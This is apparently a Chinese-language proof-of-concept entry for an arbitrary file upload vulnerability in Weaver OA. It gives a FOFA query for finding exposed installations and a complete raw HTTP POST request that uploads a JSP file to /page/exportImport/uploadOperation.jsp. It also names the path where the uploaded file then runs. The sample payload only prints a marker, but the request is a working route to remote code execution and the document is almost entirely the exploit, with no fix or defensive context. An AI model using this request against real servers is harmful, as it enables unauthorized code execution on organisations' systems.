### 描述
fofa app="Weaver-OA"

### POC & 利用
```

POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: x.x.x.x
Content-Length: 216
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
Connection: close

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="12.jsp"
Content-Type: application/octet-stream

<%out.print(1111);%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--
```

### 然后访问
`page/exportImport/fileTransfer/12.jsp`
